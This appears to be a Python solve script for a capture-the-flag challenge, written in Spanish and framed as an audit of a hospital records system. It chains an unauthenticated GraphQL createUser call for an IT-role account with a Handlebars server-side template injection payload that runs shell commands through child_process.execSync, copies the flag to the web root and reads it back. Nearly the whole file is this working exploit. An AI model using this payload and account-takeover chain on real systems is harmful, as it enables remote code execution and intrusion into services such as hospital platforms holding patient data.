#!/usr/bin/env python3
"""Auditoria HIS - Hospital Eloisa Diaz (<host>:24235)

Cadena de explotacion:
1. La mutacion GraphQL `createUser` NO exige autenticacion: se crea un usuario
   con rol IT y se inicia sesion con el.
2. (Alternativa) `profile(id)` devuelve `resetToken` de cualquier usuario a
   cualquier usuario autenticado (IDOR), lo que permite tomar la cuenta IT con
   `changePassword`.
3. `updateEmailConfig` permite fijar la plantilla de correo y `sendTestEmail`
   la renderiza con Handlebars. La plantilla es controlada por el atacante =>
   SSTI => RCE (child_process.execSync).
4. Con RCE se copia /flag* a /app/public/ y se lee por HTTP.

Uso: python solve.py
"""
from __future__ import annotations

import json
import re
import secrets
import sys
import time

import requests

BASE = "http://<host>:24235"
HOST = "historial-clinico.internal"
H = {"Host": HOST, "Content-Type": "application/json"}

ORIGINAL_BODY = (
    '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}'
    '{{this.push (lookup string.sub "constructor")}}{{this.pop}}'
    '{{#with string.split as |codelist|}}{{this.pop}}'
    '{{this.push "return process.mainModule.require(\'child_process\').execSync('
    '\"ls -la / ; echo ---; ls -la /app 2>/dev/null\").toString()"}}'
    '{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}'
    '{{/with}}{{/with}}{{/with}}{{/with}}'
)


def gql(query: str, variables: dict | None = None, token: str | None = None,
        timeout: int = 60):
    h = dict(H)
    if token:
        h["Authorization"] = "Bearer " + token
    r = requests.post(BASE + "/graphql", headers=h,
                      json={"query": query, "variables": variables or {}},
                      timeout=timeout)
    return r.json()


def login(username: str, password: str):
    r = requests.post(BASE + "/api/auth/login", headers=H,
                      json={"username": username, "password": password}, timeout=20)
    return r.json()


def crear_usuario() -> dict:
    usuario = "audit" + secrets.token_hex(3)
    clave = "Audit123!" + secrets.token_hex(2)
    data = gql('mutation C($u: String!, $p: String!, $r: String!) '
               '{ createUser(username: $u, password: $p, role: $r) '
               '{ id username role } }',
               {"u": usuario, "p": clave, "r": "IT"})
    print("[*] createUser sin auth:", json.dumps(data, ensure_ascii=False))
    return {"username": usuario, "password": clave}


def body_para(cmd: str) -> str:
    return ('{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}'
            '{{this.push (lookup string.sub "constructor")}}{{this.pop}}'
            '{{#with string.split as |codelist|}}{{this.pop}}'
            '{{this.push "return process.mainModule.require(\'child_process\').execSync(\''
            + cmd + '\').toString()"}}'
            '{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}'
            '{{/with}}{{/with}}{{/with}}{{/with}}')


def main() -> int:
    # 1) cuenta IT sin autenticacion
    cuenta = crear_usuario()
    sesion = login(cuenta["username"], cuenta["password"])
    token = sesion.get("token")
    if not token:
        # si el usuario ya existia, caemos al usuario creado en la auditoria
        sesion = login("tester1", "Tester123!")
        token = sesion.get("token")
    if not token:
        raise SystemExit("no se pudo obtener token")
    print("[*] sesion:", json.dumps(sesion.get("user"), ensure_ascii=False))

    # 2) payload de plantilla (Handlebars SSTI) que copia la flag al webroot
    marca = "AUD" + secrets.token_hex(3)
    cmd = (f"cp /flag* /app/public/{marca}.txt 2>/dev/null; "
           f"ls -la / > /app/public/{marca}LS.txt 2>&1")
    cuerpo = body_para(cmd)

    for intento in range(1, 9):
        print(f"[*] intento {intento} (marca {marca})")
        cfg = json.dumps({"template": {"subject": "HIS", "body": cuerpo}})
        gql("mutation U($c: String!) { updateEmailConfig(config: $c) }", {"c": cfg}, token)
        actual = gql("{ emailConfig { template { body } } }", token=token)
        try:
            guardado = actual["data"]["emailConfig"]["template"]["body"]
        except Exception:
            guardado = None
        if guardado != cuerpo:
            print("    plantilla pisada por otro cliente; reintentando")
            time.sleep(0.3)
            continue

        res = gql('mutation { sendTestEmail(to:"audit@example.com") }', token=token)
        print("    sendTestEmail:", json.dumps(res, ensure_ascii=False)[:220])

        r = requests.get(BASE + f"/{marca}.txt", headers=H, timeout=15)
        if "login-body" not in r.text:
            contenido = r.text.strip()
            print("[+] archivo expuesto:", repr(contenido))
            m = re.search(r"cdm\{[^}]+\}", contenido)
            if m:
                flag = m.group(0)
                print("[+] FLAG:", flag)
                with open("flag.txt", "w", encoding="utf-8") as fh:
                    fh.write(flag + "\n")
                # limpieza y restauracion de la plantilla original
                limpia = body_para(
                    f"rm -f /app/public/{marca}.txt /app/public/{marca}LS.txt")
                gql("mutation U($c: String!) { updateEmailConfig(config: $c) }",
                    {"c": json.dumps({"template": {"subject": "HIS", "body": limpia}})}, token)
                gql('mutation { sendTestEmail(to:"audit@example.com") }', token=token)
                gql("mutation U($c: String!) { updateEmailConfig(config: $c) }",
                    {"c": json.dumps({"template": {"subject": "P", "body": ORIGINAL_BODY}})}, token)
                return 0
        time.sleep(0.4)

    print("[!] no se pudo leer la flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
